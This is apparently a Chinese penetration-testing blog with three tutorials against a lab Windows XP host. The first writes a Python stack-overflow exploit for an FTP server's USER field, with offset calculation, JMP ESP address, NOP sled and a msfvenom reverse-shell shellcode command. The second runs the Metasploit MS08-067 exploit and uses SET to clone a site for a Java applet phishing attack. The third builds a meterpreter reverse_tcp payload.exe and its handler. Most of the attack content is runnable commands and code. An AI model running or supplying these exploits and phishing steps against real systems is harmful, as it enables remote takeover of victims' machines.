href="#溢出测试" class="headerlink" title="溢出测试"></a>溢出测试</h5><p>我们重复正常登录的步骤，只不过此次测试的用户名和密码我们可以输入超长字符串进行测试，测试的同时使用wiresharke进行抓包分析：<br>测试1(超长字符串a，字符串长度随机)：<br><img src="https://pic2.superbed.cn/item/5df5be68a4fbc8614a80ec2e.jpg" alt=""><br>对上述操作所抓取的数据包如下所示：<br><img src="https://pic3.superbed.cn/item/5df5c192a4fbc8614a819df9.jpg" alt=""></p><p>测试2(超长字符串b，字符串长度随机)：<br><img src="https://pic2.superbed.cn/item/5df5c4cea4fbc8614a822fa3.jpg" alt=""><br>对上述操作所抓取的数据包如下所示：<br><img src="https://pic.superbed.cn/item/5df5c803a4fbc8614a82bb2b.jpg" alt=""></p><p>进行上述测试后，我们发现目标的系统仍然正常登录，系统并没有崩溃。但是，对数据包进行分析，我们会发现不论我们随机输入多少超长字符串，最终发送的只有78个字符(a、b)，显然这个长度的字符串无法引起溢出，但是我们可以通过自行构造数据包，然后将数据包发送出去。</p><h5 id="用Python编写数据包"><a href="#用Python编写数据包" class="headerlink" title="用Python编写数据包"></a>用Python编写数据包</h5><p>在Windows 7中安装Python运行环境(IDLE),在IDLE中执行下列代码：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> socket  <span class="token comment" spellcheck="true">#导入需要使用的socket库</span>s <span class="token operator">=</span> socket.socket<span class="token punctuation">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#创建一个套接字</span>connect <span class="token operator">=</span> s.connect<span class="token punctuation">((</span><span class="token string">'192.168.75.130'</span><span class="token punctuation">)</span>，21<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#利用套接字建立目标的连接</span>s.send<span class="token punctuation">(</span><span class="token string">'USER aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\r\n'</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#通过套接字将随机超长字符串(上百位)以数据包的形式发送出去</span></code></pre><p>在WindowsXP界面出现如下窗口则证明发送溢出：<br><img src="https://pic.downk.cc/item/5e8ad454504f4bcb04ea2762.jpg" alt=""><br>点击生成错误报告，可以查看发生错误的地址信息：<br><img src="https://pic.downk.cc/item/5e8ad46d504f4bcb04ea4109.png" alt=""></p><h3 id="计算软件溢出的偏移地址"><a href="#计算软件溢出的偏移地址" class="headerlink" title="计算软件溢出的偏移地址"></a>计算软件溢出的偏移地址</h3><p>EIP寄存器：用来存储CPU要读取指令的地址<br>根据错误报告的地址信息，以及溢出原理，出现这种情况的原因是下一条保存地址的EIP寄存器中的地址被溢出的字符“a”所覆盖,”\x61”(16进制)在ASCII表中表示的就是字符’a,也就是说现在EIP寄存器的内容就是’aaaa’,而操作系统无法在这个位置找到一条可以执行的命令，从而引发系统的崩溃。</p><p>我们可以在错误报告中看到EIP寄存器的地址，但是程序在操作系统中的执行是动态的，也就是说每一次这个软件执行时所分配的地址都是不同的，所以我们现在需要知道EIP寄存器相对于输入数据起始位置的相对偏移。</p><h4 id="借助Metasploit计算溢出的相对偏移地址"><a href="#借助Metasploit计算溢出的相对偏移地址" class="headerlink" title="借助Metasploit计算溢出的相对偏移地址"></a>借助Metasploit计算溢出的相对偏移地址</h4><p>要计算EIP寄存器相对于输入数据起始位置的相对偏移，需要使用Metasploit中内置的两个工具<font color="#fb8c00">pattern_create</font>和<font color="#fb8c00">pattern_offset</font></p><h5 id="使用pattern-create创建字符串"><a href="#使用pattern-create创建字符串" class="headerlink" title="使用pattern_create创建字符串"></a>使用pattern_create创建字符串</h5><p>pattern_create可以用来创建一段没有重复字符的文本，我们将这段文本发送到目标服务器，当发生溢出时，记录下程序发生错误的地址(也就是EIP中的内容)，这个地址其实就是文本中的四个字符。</p><p>启动Kali，打开终端输入以下指令：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/share/metasploit-framework/tools/exploit./pattern_create.rb -h  //pattern_create.rb是一个由ruby语言编写的脚本，使用-h参数可以查看可以使用的参数以及用法./pattern_create.rb -l 500 //生成一段500个字符的文本输出结果：Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq</code></pre><p>在python编写的数据包将send()函数传递的超长字符串换为上述文本，即在编写数据包部分将最后的传输数据部分替换为：</p><pre class=" language-bash"><code class="language-bash">s.send<span class="token punctuation">(</span><span class="token string">'USER Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq\r\n'</span><span class="token punctuation">)</span></code></pre><p>同样地，该超长字符串会引发windowsXP中的FTP软件的溢出错误，我们同样可以根据错误报告获得溢出的地址：<br><img src="https://pic.downk.cc/item/5e8ad482504f4bcb04ea58a9.png" alt=""></p><h5 id="使用pattern-offset计算偏移地址"><a href="#使用pattern-offset计算偏移地址" class="headerlink" title="使用pattern_offset计算偏移地址"></a>使用pattern_offset计算偏移地址</h5><p>在Kali终端输入以下命令：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/share/metasploit-framework/tools/exploit./pattern_offset.rb -h  //查看帮助./pattern_offset.rb -q 37684136 -l 500 //-q后的参数为上述错误报告中的出错地址，-l为pattern_create中生成字符串的长度输出结果：230</code></pre><p>上述命令的输出结果230就是EIP寄存器相对于输入数据起始位置的相对偏移，所以我们只需提供230个字符”a”就可以使FTP发生溢出错误。我们重复之前的步骤，将python构建数据包的步骤改为执行下列代码：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> socketbuf <span class="token operator">=</span> <span class="token string">"\x61"</span>*230+<span class="token string">"\x62"</span>*4  //230个<span class="token string">'a'</span>字符，4个<span class="token string">'b'</span>字符target <span class="token operator">=</span> <span class="token string">"192.168.75.130"</span>  //FTP所在主机的IP地址s <span class="token operator">=</span> socket.socket<span class="token punctuation">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="token punctuation">)</span>s.connect<span class="token variable"><span class="token punctuation">((</span>target<span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">))</span></span>s.send<span class="token punctuation">(</span><span class="token string">"USER "</span>+buf+<span class="token string">"\r\n"</span><span class="token punctuation">)</span>s.close<span class="token punctuation">(</span><span class="token punctuation">)</span>   //关闭套接字</code></pre><p>执行结束后可以看到FTP程序已经崩溃，并且产生如下图所示错误报告：<br><img src="https://pic.downk.cc/item/5e8ad494504f4bcb04ea6a1c.png" alt=""><br>从上图的错误地址62626262可以看出，EIP的地址已经为字符“bbbb”，这验证了我们找到的偏移地址的正确性。</p><h3 id="查找JMP-ESP指令"><a href="#查找JMP-ESP指令" class="headerlink" title="查找JMP ESP指令"></a>查找JMP ESP指令</h3><p>ESP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶<br>EBP：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。</p><p>因为操作系统在程序的每一次执行过程中都会为其分配不同的地址，所以即使我们可以决定程序下一步执行的地址(EIP中的内容)，但是不知道我们的攻击载荷位于哪个位置，所以还是没有办法让目标服务器执行这个恶意的攻击载荷。</p><p>接下来我们就要想个办法，让EIP中的地址指向我们的攻击载荷，我们首先需要看一下输入的用户名数据在执行时是如何分布的，如下图所示：<br><img src="https://pic.downk.cc/item/5e8ad4aa504f4bcb04ea7fdd.jpg" alt=""></p><p>按照栈的设计，ESP寄存器应该就位于EIP寄存器之后(中间可能有一些空隙)，如下图所示：<br><img src="https://pic.downk.cc/item/5e8ad4ba504f4bcb04ea9334.jpg" alt=""><br>因为这种设计，ESP寄存器就是我们最理想的选择，原因如下：</p><ol><li>我们在使用大量字符来溢出栈的时候，也可以使用特定的字符来覆盖ESP</li><li>我们虽然无法对ESP寄存器进行定位，但是可以利用一条“JMP ESP”(汇编指令)的跳转指令来实现跳转到当前ESP寄存器。</li></ol><h4 id="查找地址不会改变的JMP-ESP指令"><a href="#查找地址不会改变的JMP-ESP指令" class="headerlink" title="查找地址不会改变的JMP ESP指令"></a>查找地址不会改变的JMP ESP指令</h4><p>接下来，我们需要做的工作是找到一条地址不会发生改变的JMP ESP指令。</p><ul><li>ntdll.dll(NT Layer DLL)是Windows NT操作系统的重要模块，属于系统级别的文件。用于堆栈释放、进程管理。</li><li>kernel32.dll是Windows 9x/Me中非常重要的32位动态链接库文件，属于内核级文件，它控制着系统的内存管理、数据的输入输出操作和中断处理，当Windows启动时，kernel.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域。</li><li>一些经常会用到的动态链接会被映射到内存，如kernel32.dll、user32.dll会被几乎所有进程加载，且加载的基址始终相同(不同的操作系统可能不同)。我们只需在这些动态链接库中找到JMP ESP命令就可以了，此时我们找到的JMP ESP的地址就一直都不会变。</li></ul><p>dll文件中的JMP ESP指令的地址可以通过调试器或代码执行找到。</p><h3 id="编写渗透测试程序"><a href="#编写渗透测试程序" class="headerlink" title="编写渗透测试程序"></a>编写渗透测试程序</h3><h4 id="字节序"><a href="#字节序" class="headerlink" title="字节序"></a>字节序</h4><p>现在我们找到的JMP ESP指令的地址(假设为7C9D30D7)还存在一个问题，同样的地址数据在网络传输和CPU存储时的表示方法是不同的：</p><ul><li>大端(Big-Endian)：高位在前(其中“前”是指靠近内存的低地址，存储在硬盘上就是先写的字节)</li><li>小端(Little-Endian):低位在前(低位字节存储在内存低地址，字节高低顺序和内存高低顺序相同)</li></ul><p>网络字节序(Network Byte Order)一般指大端(对大部分网络传输协议而言)，大小端的概念是面向多字节数据类型的存储方式定义的。</p><h4 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h4><p>我们找到的JMP ESP的地址(7C9D30D7)其实是小端格式，如果我们希望使用7C9D30D7来覆盖目标地址，在使用Python编写渗透程序时就应该倒置地址’\xD7\x30\x9D\x7C’<br>此时，我们的脚本应为：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> sockets <span class="token operator">=</span> socket.socket<span class="token punctuation">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="token punctuation">)</span>connect <span class="token operator">=</span> s.connect<span class="token punctuation">((</span><span class="token string">'192.168.75.130'</span>,21<span class="token punctuation">))</span>buf <span class="token operator">=</span> <span class="token string">"\x61"</span>*230+<span class="token string">"\xD7\x30\x9D\x7C"</span>  //填充230个<span class="token string">'a'</span>后到达EIP寄存器，<span class="token string">"\xD7\x30\x9D\x7C"</span>就是此时EIP寄存器中的内容s.send<span class="token punctuation">(</span><span class="token string">'USER'</span>+buf+<span class="token string">"\r\n"</span><span class="token punctuation">)</span></code></pre><p>要对目标主机进行缓冲区溢出攻击，只需在传送的数据之后加上我们想要目标计算机上执行的代码即可(即payload)，详情请对shellcode编程进行了解，下文我们采用shellcode代替这部分代码：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> sockets <span class="token operator">=</span> socket.socket<span class="token punctuation">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="token punctuation">)</span>connect <span class="token operator">=</span> s.connect<span class="token punctuation">((</span><span class="token string">'192.168.75.130'</span>,21<span class="token punctuation">))</span>buf <span class="token operator">=</span> <span class="token string">"\x61"</span>*230+<span class="token string">"\xD7\x30\x9D\x7C"</span>+shellcode  //填充230个<span class="token string">'a'</span>后到达EIP寄存器，<span class="token string">"\xD7\x30\x9D\x7C"</span>就是此时EIP寄存器中的内容s.send<span class="token punctuation">(</span><span class="token string">'USER'</span>+buf+<span class="token string">"\r\n"</span><span class="token punctuation">)</span></code></pre><blockquote><p>注：shellcode也可以使用metasploit来生成： msfvenom -p windows/shell_reverse_tcp LHOST=192.168.75.129 LPORT=443 -b ‘\x00\x0a\x40’(坏字符) -f c</p></blockquote><h5 id="加入空指令"><a href="#加入空指令" class="headerlink" title="加入空指令"></a>加入空指令</h5><p>完成上述操作后，目标的系统FTP已经崩溃，但是，我们的shell代码却没有启动，原因就是ESP的地址向后发生了偏移，这样就导致了shellcode的代码并没有完全载入到ESP中，最前面的一部分在ESP的外面，从而导致程序不能正常执行。</p><p>解决上述问题的一个方法就是加入空指令”\x90”(NOPS),这个指令不会执行任何实际操作，但它也是一条指令，因此会顺序地向下执行这样即使我们不知道ESP的真实地址，只需要在EIP后面添加一些空指令，只要这些空指令足够多到将shellcode偏移进ESP，就可以顺利执行shellcode。所以此时，我们的脚本代码中的buf应该改为以下代码：</p><pre class=" language-bash"><code class="language-bash">buf <span class="token operator">=</span> <span class="token string">"\x61"</span>*230+<span class="token string">"\xD7\x30\x9D\x7C"</span>+<span class="token string">"\x90"</span>*20+shellcode //</code></pre><h3 id="坏字符"><a href="#坏字符" class="headerlink" title="坏字符"></a>坏字符</h3><p>虽然上述渗透测试程序编写得很成功，但是在实际中却未必如此顺利。我们在上述示例中发送的数据都是FTP用户名的内容，如果FTP对用户名输入有限制，并过滤了一些字符，而我们的shellcode中也包含了这种不被允许的字符，就可能导致FTP服务器拒绝接收后面的内容，从而导致代码只传了一部分。所以找出坏字符也是我们溢出漏洞攻击的一个重要环节。</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试知识点(5)</title>
      <link href="/2019/11/24/penetrationtest5/"/>
      <url>/2019/11/24/penetrationtest5/</url>
      
        <content type="html"><![CDATA[<h2 id="渗透攻击"><a href="#渗透攻击" class="headerlink" title="渗透攻击"></a>渗透攻击</h2><h3 id="Metasploit基础"><a href="#Metasploit基础" class="headerlink" title="Metasploit基础"></a>Metasploit基础</h3><p>Metasploit是一个集成了多个漏洞测试工具的框架。Metaslpoit在kali中已经内置，启动只需在终端输入以下命令：</p><pre class=" language-bash"><code class="language-bash">msfconsole</code></pre><p>启动后显示的模板如下：<br><img src="https://i.postimg.cc/v8Px4Y9k/1.jpg" alt=""><br>第一行给出当前Metasploit的版本，其中包含了7个模块：1949个exploits，1089个auxiliary,334个posts，558个payloads,<br>45个encoders,10个nops，7个evasion</p><h4 id="常用模块的作用"><a href="#常用模块的作用" class="headerlink" title="常用模块的作用"></a>常用模块的作用</h4><ul><li>漏洞渗透模块(exploits)：用于发现漏洞后对漏洞进行利用。每一个模块对应着一个漏洞，发现了目标的漏洞后，我们无需知道漏洞是怎样产生的，甚至无需会编程，只需要知道漏洞的名字，然后执行对应的漏洞模块，就可以实现对目标的入侵。</li><li>辅助模块(auxiliary)：进行信息收集的模块，例如一些信息侦查、网络扫描类的工具。</li><li>攻击载荷模块(payloads)：被控端程序，可以帮助我们在目标上完成远程控制操作，通常这些模块既可以单独执行，也可以和漏洞渗透模块一起执行</li><li>后渗透攻击模块(post)：当我们成功获取目标的控制权后，这类模块就能帮助我们提高控制权限、获取敏感信息、实施跳板攻击等</li><li>evasion模块：创建反杀毒软件的木马(绕过杀毒软件)</li></ul><h4 id="Metasploit命令的分类"><a href="#Metasploit命令的分类" class="headerlink" title="Metasploit命令的分类"></a>Metasploit命令的分类</h4><p>启动metasploit后在msf&gt;后输入以下命令会显示系统提供的命令</p><pre class=" language-bash"><code class="language-bash"><span class="token function">help</span></code></pre><ul><li>核心命令(core command)</li><li>模块命令(module command)</li><li>任务命令(job command)</li><li>资源命令(resource script command)</li><li>数据库后台命令(database backend command)</li><li>登录凭证后台命令(credentials backend command)</li></ul><h3 id="使用Metasploit对操作系统进行攻击"><a href="#使用Metasploit对操作系统进行攻击" class="headerlink" title="使用Metasploit对操作系统进行攻击"></a>使用Metasploit对操作系统进行攻击</h3><p>使用namp对WindowsXP系统进行漏洞扫描：</p><pre class=" language-bash"><code class="language-bash">nmap -sV -p- --script vuln --script-args unsafe 192.168.75.130</code></pre><p>上诉IP地址为WindowsXP的IP地址，得到的结果如图所示：<br><img src="https://i.postimg.cc/HsVc5q9x/2.png" alt=""><br>上图显示WindowsXP有MS08_067的漏洞，下面使用Metasploit对该漏洞进行利用</p><ol><li><p>启动Metasploit后，使用<font color="#fb8c00">search</font>命令查看针对MS08_067的渗透模块：</p><pre class=" language-bash"><code class="language-bash">search ms08_067</code></pre><p><img src="https://i.postimg.cc/yYtJTLLT/3.png" alt=""></p></li><li><p>对找到的渗透模块进行利用：</p><pre class=" language-bash"><code class="language-bash">use exploit/windows/smb/ms08_067_netapi<span class="token punctuation">(</span>渗透模块的名字<span class="token punctuation">)</span></code></pre></li><li><p>通过以下命令查看这个模块需要设置的参数</p><pre class=" language-bash"><code class="language-bash">show options</code></pre><p><img src="https://i.postimg.cc/K8T1ptVh/4.png" alt=""><br>由搜索结果可知我们需要对RHOST(靶机的IP地址)进行设置，其他两个值使用默认值即可</p></li><li><p>对参数进行设置：</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">set</span> RHOST 192.168.75.130 <span class="token punctuation">(</span>靶机IP地址<span class="token punctuation">)</span></code></pre></li><li><p>加入在目标系统中完成特定任务的程序B,即攻击载荷(请参阅渗透测试(4))</p><pre class=" language-bash"><code class="language-bash">show payloads  //查看该模块可利用的攻击载荷<span class="token keyword">set</span> payload windows/meterpreter/reverse_tcp  //选择其中一个设置为攻击载荷</code></pre><p><font color="#fb8c00">windows/meterpreter/reverse_tcp</font>是在渗透测试(4)中所陈述的远程控制程序。</p></li><li><p>为攻击载荷设置参数：</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">set</span> LHOST 192.168.75.129  //设置主控端IP地址<span class="token keyword">set</span> LPORT 8888          //设置主控端的端口</code></pre></li><li><p>开始攻击：</p><pre class=" language-bash"><code class="language-bash">exploit</code></pre><p>如果出现<font color="#fb8c00">meterpreter &gt; </font>的符号则证明攻击成功，进入后渗透阶段</p></li></ol><blockquote><p>注：如果该攻击过程出现连接错误，可以通过show targets命令查看靶机操作系统对应的target id,再使用set target id(eg. set target 10)命令再执行exploit</p></blockquote><h3 id="使用Metasploit对应用程序进行攻击"><a href="#使用Metasploit对应用程序进行攻击" class="headerlink" title="使用Metasploit对应用程序进行攻击"></a>使用Metasploit对应用程序进行攻击</h3><p>当我们在操作系统上找不到漏洞时，就可以将目光移动到上面的应用程序中</p><h2 id="社会工程学工具"><a href="#社会工程学工具" class="headerlink" title="社会工程学工具"></a>社会工程学工具</h2><p>社会工程学是一种通过研究受害者心理，并以此诱使受害者做出配合，从而达到自身目的的方法。</p><h3 id="SET"><a href="#SET" class="headerlink" title="SET"></a>SET</h3><p>SET(Socail-Engineer Toolkit,社会工程学工具包)，是常用的社会工程学工具的集合，其中包含了很多渗透测试工具。Kali中已经内置，在Kali应用中点击SET图标即可启动工具。<br>启动后的界面如图所示：<br><img src="https://i.postimg.cc/d0mLwwwW/5.png" alt=""></p><p>我们选择1社会工程学攻击来查看该选项包含的功能：<br><img src="https://i.postimg.cc/vHJBncmq/6.png" alt=""></p><h4 id="SET工具包中的网页攻击方法"><a href="#SET工具包中的网页攻击方法" class="headerlink" title="SET工具包中的网页攻击方法"></a>SET工具包中的网页攻击方法</h4><p>我们选择社会工程学攻击中的2(Website Attack Vector),启动会产生如下选项：<br><img src="https://i.postimg.cc/Jzjh5MD1/7.jpg" alt=""></p><h5 id="Applet攻击"><a href="#Applet攻击" class="headerlink" title="Applet攻击"></a>Applet攻击</h5><p><font color="#fb8c00">1)Java Applet Attack Method</font> 这种方法与java applet有关，java applet就是用java语言编写的小应用程序，它们可以直接嵌入到网页中，并能够产生特殊的效果，Applet经编译后，会产生.class文件，把.class的文件嵌入到html的网页中，只要用户连到一个网页里，Applet就会随着网页下载到用户的计算机运行。</p><p>此种攻击方式属于网站攻击，所以必须先建立一个网站出来，对于网站建立SET提供了以下三种方式：<br><img src="https://i.postimg.cc/3wBJz1FV/8.jpg" alt=""></p><ul><li><font color="#fb8c00">1)Web Templates</font> 利用SET中自带的模板作为钓鱼网站</li><li><font color="#fb8c00">2)Site Cloner</font> 可以克隆任何网站，可以使用它模拟出想要冒充的网站</li><li><font color="#fb8c00">3)Custom Import</font> 允许导入自己的网站</li></ul><p>我们选择2进行网站克隆，因为我们要在内网建立一个网站，所以不用.NAT技术，选择no。<br>用Java写的小程序如果没有经过签名，那么访问客户端程序下载后会受到安全限制，在这里我们需要使用一个经过签名的Applet，选择2：<br><img src="https://i.postimg.cc/0Qy2vStQ/9.jpg" alt=""></p><p>接下来需要输入所克隆网站的地址，出现以下语句就提示我们可以在新克隆好的网站上展开一次Java Applet攻击：<br><img src="https://i.postimg.cc/G2g3mpNj/10.jpg" alt=""><br>选择其中一个攻击载荷(默认)，设置用来监听的端口(默认)，接下来选择payload的连接方式。</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 安全 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试知识点(4)</title>
      <link href="/2019/11/17/penetrationtest4/"/>
      <url>/2019/11/17/penetrationtest4/</url>
      
        <content type="html"><![CDATA[<h2 id="发现漏洞后"><a href="#发现漏洞后" class="headerlink" title="发现漏洞后"></a>发现漏洞后</h2><p>经过前面的步骤后，我们已经发现了漏洞，接下来就是向目标系统发送一个程序，这个程序通常由两个子程序构成：</p><ul><li>一个是针对目标漏洞的渗透程序A</li><li>一个是在目标系统完成指定任务的程序B<br>进行渗透的时候，我们将子程序A和子程序B一起发送到目标系统的特定端口上，子程序A会利用目标系统的漏洞，在目标系统上执行子程序B，子程序B的作用是在目标上执行一些任务，比如远程控制、信息监听、文件下载等。</li></ul><h2 id="渗透测试模块"><a href="#渗透测试模块" class="headerlink" title="渗透测试模块"></a>渗透测试模块</h2><p>如果把漏洞比作是一栋建筑物中上了锁的入口的话，那么我们现在需要做的就是一把能打开入口的钥匙,这把钥匙就是渗透测试模块(子程序A)，我们的工作就是要找到这个渗透测试模块。我们可以通过<a href="https://www.exploit.db.com/" target="_blank" rel="noopener">https://www.exploit.db.com/</a> 来搜索渗透测试模块，也可以使用kali linux自带的漏洞库。(请参阅渗透测试(5))<br>查找某个软件漏洞的方式是在终端输入以下命令：(此处以easyFileSharing为例)</p><pre class=" language-bash"><code class="language-bash">searchsploit 软件名searchsploit easy <span class="token function">file</span> sharing </code></pre><h2 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h2><p>上文中我们把漏洞渗透模块比作一把进入目标系统的钥匙，现在我们已经获得了这把钥匙，接下来可以把一段代码(Shellcode)送到目标系统并执行。</p><h3 id="远程控制程序"><a href="#远程控制程序" class="headerlink" title="远程控制程序"></a>远程控制程序</h3><p>指的是可以在一台设备上操纵另一台设备的软件。远程控制程序分为两个部分，被控端和主控端。远程控制软件的分类有很多，最为常用的两个标准如下所示:</p><ul><li>按照远程控制软件被控端与主控端的连接方式：将远程控制软件分为正向和反向。(正向远程控制中，被控端只会在自己的主机上打开一个端口，然后等待主控端计算机的连接，所以使用这种方式主控端必须知道被控端的IP地址；但在反向远程控制中，主控端不需要知道被控端的IP地址，只需把这个远程控制程序发送给被控端即可)。</li><li>按照目标操作系统的不同分类：比如在Windows平台下使用的远程控制程序对于Android操作系统是没有用的。</li></ul><h2 id="在kali中对WindosXP进行远程控制"><a href="#在kali中对WindosXP进行远程控制" class="headerlink" title="在kali中对WindosXP进行远程控制"></a>在kali中对WindosXP进行远程控制</h2><h3 id="在Kali中生成被控端"><a href="#在Kali中生成被控端" class="headerlink" title="在Kali中生成被控端"></a>在Kali中生成被控端</h3><p>生成被控端只需要考虑4点：</p><ol><li>选用哪个payload</li><li>设置payload参数</li><li>输出payload格式</li><li>输出payload位置</li></ol><p>在kali中生成远程控制被控端程序，在kali终端输入以下命令：</p><pre class=" language-bash"><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp lhost<span class="token operator">=</span>192.168.190.134 lport<span class="token operator">=</span>5000 -f exe -o /root/payload.exe</code></pre><ul><li><font color="#fb8c00">-p</font> 指定要生成的payload(攻击载荷)，如果要使用自定义的payload，则使用<font color="#fb8c00">-</font>或<font color="#fb8c00">stdin</font>指定，上例中的<font color="#fb8c00">windows/meterpreter/reverse_tcp</font>是一个用于Windows平台下的反向远程控制程序。</li><li><font color="#fb8c00">lhost</font> 指定接收被控端信息的主机(攻击载荷的参数之一)</li><li><font color="#fb8c00">lport</font> 指定接收被控端信息的端口(攻击载荷的参数之一)</li><li><font color="#fb8c00">-f</font> 指定输出的格式(可以使用-help–format来获得msf支持的输出格式列表)</li><li><font color="#fb8c00">-o</font> 指定存储攻击载荷(payload)的路径<br>该命令执行后，会在参数<font color="#fb8c00">-o</font>后指定的路径中建立一个文件payload.exe，将该文件放入被控端主机中(WindowsXP系统)。</li></ul><blockquote><p>注：上述lhost、lport都是攻击载荷的参数，攻击载荷不同，需要设置的参数也不同，可以使用 </p></blockquote><h3 id="在kali中启动主控端"><a href="#在kali中启动主控端" class="headerlink" title="在kali中启动主控端"></a>在kali中启动主控端</h3><p>在主控端主机(kali)中启动metasploit(请参阅渗透测试(5)):</p><pre class=" language-bash"><code class="language-bash">msfconsole </code></pre><p>在Metasploit使用handler来作为主控端：</p><pre class=" language-bash"><code class="language-bash">msf<span class="token operator">></span> use exploit/multi/handler</code></pre><p>对主控端进行设置：</p><pre class=" language-bash"><code class="language-bash">msf<span class="token operator">></span> <span class="token keyword">set</span> payload widnows/meterpreter/reverse_tcp   //设置攻击载荷msf<span class="token operator">></span> <span class="token keyword">set</span> lhost 192.168.190.135   //设置攻击载荷的参数msf<span class="token operator">></span> <span class="token keyword">set</span> lport 5000              //设置攻击载荷的参数</code></pre><p>执行攻击：</p><pre class=" language-bash"><code class="language-bash">msf<span class="token operator">></span> exploit</code></pre><p>整体过程如下，出现最后一行表示攻击程序启动成功<br><img src="https://i.postimg.cc/k4qRbDT3/1.jpg" alt=""></p><p>在被控端(windowsXP)打开payload.exe文件，然后会在主控端出现以下字样，表示已经成功取得被控端的控制权，在<font color="#fb8c00">meterpreter</font>后输入相关操作对被控端(WindowsXP)进行控制。<br><img src="https://i.postimg.cc/Ssd27qPX/2.png" alt=""></p><h2 id="meterpreter在各种操作系统中的应用"><a href="#meterpreter在各种操作系统中的应用" class="headerlink" title="meterpreter在各种操作系统中的应用"></a>meterpreter在各种操作系统中的应用</h2><p>上述我们使用的被控端程序是基于Metasploit中提供的<font color="#fb8c00">windows/meterpreter/reverse_tcp</font>生成的。Metasploit分类下提供大量的被控端程序，后面介绍的payload也可以等同于被控端程序，，使用如下命令可以查看所有可使用的payload：</p><pre class=" language-bash"><code class="language-bash">msfvenom -l payloads</code></pre><p>得到的结果如图所示：<br><img src="https://i.postimg.cc/brvGmWXm/3.jpg" alt=""><br><font color="#fb8c00">Name</font>为Payload的名称，<font color="#fb8c00">Description</font>是对漏洞的描述。</p><ul><li>所有payload模块的名字都使用三段式的标准，就是采用针对的操作系统+控制方式+模块具体名称组成，比如上例中的<font color="#fb8c00">windows/meterpreter/reverse_tcp</font></li><li>payload提供的控制方式主要有<font color="#fb8c00">shell</font>和<font color="#fb8c00">meterpreter</font>等几种</li><li>在最后面的模块名称中一般会表明是正向还是反向方式，以及采用哪一种网络协议进行传输。</li></ul><p>每个Payload在使用的时候都需要设置一些参数，可以使用选项<font 